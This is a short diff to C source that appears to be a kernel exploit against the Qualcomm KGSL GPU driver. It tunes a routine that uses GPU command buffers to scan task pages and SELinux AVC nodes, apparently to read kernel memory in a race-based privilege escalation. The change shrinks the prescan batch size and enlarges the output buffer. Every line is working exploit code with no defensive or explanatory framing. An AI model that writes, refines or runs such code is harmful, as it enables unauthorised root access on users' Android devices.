@@ -76,6 +76,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define AVC_NODE_STRIDE 72
 #define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
 #define AVC_PAGES_PER_IB 12
+#define PRE_PAGES_PER_IB 4
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
@@ -248,11 +249,11 @@ static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     uint64_t va = scan_start;
     while (va < end_va && n < maxout) {
         memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, AVC_PAGES_PER_IB * SCAN_DWORDS * 4);
+        memset(dst_m, 0, PRE_PAGES_PER_IB * SCAN_DWORDS * 4);
         dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
         int batch = 0;
-        for (; batch < AVC_PAGES_PER_IB && va < end_va; batch++, va += 0x1000) {
+        for (; batch < PRE_PAGES_PER_IB && va < end_va; batch++, va += 0x1000) {
             for (int w = 0; w < SCAN_DWORDS; w++) {
                 uint32_t dl, dh, sl, sh;
                 split64(dst_ga + (batch * SCAN_DWORDS + w) * 4, &dl, &dh);
@@ -382,8 +383,8 @@ int main(int argc, char **argv) {
     uint64_t ib_ga = 0;
     gpuobj_info(ib_id, &ib_ga);
 
-    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
-    void *dst_m = gpuobj_mmap(0x4000, dst_id);
+    int dst_id = gpuobj_alloc(0x10000, alloc_flags);
+    void *dst_m = gpuobj_mmap(0x10000, dst_id);
     uint64_t dst_ga = 0;
     gpuobj_info(dst_id, &dst_ga);
 
